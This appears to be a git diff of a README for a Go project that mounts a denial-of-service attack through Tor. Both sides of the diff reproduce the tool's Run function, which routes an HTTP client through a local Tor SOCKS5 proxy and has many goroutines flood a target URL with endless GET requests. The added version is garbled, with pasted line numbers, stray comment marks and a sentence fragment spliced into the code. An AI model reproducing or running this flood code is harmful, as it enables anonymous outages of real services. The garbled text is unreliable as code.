@@ -26,28 +26,50 @@ Denial Of Service attack in GO using TOR
           *********************************************************************************************
 
 * ddos.go  explanation 
-  #func (d *DDoS) Run() {
-	#torcon, _ := url.Parse("socks5://127.0.0.1:9050")
-	#pather, _ := proxy.FromURL(torcon, proxy.Direct)
-	#nwpath := &http.Transport{Dial: pather.Dial}
-	#client := &http.Client{Transport: nwpath}
 
-	#for i := 0; i < d.amountWorkers; i++ {
-		#go func() {
-			#for {
-				select {
-				case <-(*d.stop):
-					return
-				default:
-					// sent http GET requests
-					resp, err := client.Get(d.url)
-					atomic.AddInt64(&d.amountRequests, 1)
-					if err == nil {
-						atomic.AddInt64(&d.successRequest, 1)
-						_, _ = io.Copy(ioutil.Discard, resp.Body)
-						_ = resp.Body.Close()
-						fmt.Println(d)
-					}
+             Concurrency is not  parall #func (d *DDoS) Run() {
+31
+        #torcon, _ := url.Parse("socks5://127.0.0.1:9050")
+32
+        #pather, _ := proxy.FromURL(torcon, proxy.Direct)
+33
+        #nwpath := &http.Transport{Dial: pather.Dial}
+34
+        #client := &http.Client{Transport: nwpath}
+35
+​
+36
+        #for i := 0; i < d.amountWorkers; i++ {
+37
+                #go func() {
+38
+                        #for {
+39
+                                select {
+40
+                                case <-(*d.stop):
+41
+                                        return
+42
+                                default:
+43
+                                        // sent http GET requests
+44
+                                        resp, err := client.Get(d.url)
+45
+                                        atomic.AddInt64(&d.amountRequests, 1)
+46
+                                        if err == nil {
+47
+                                                atomic.AddInt64(&d.successRequest, 1)
+48
+                                                _, _ = io.Copy(ioutil.Discard, resp.Body)
+49
+                                                _ = resp.Body.Close()
+50
+                                                fmt.Println(d)
+51
+                                        }esism a
 
 
 
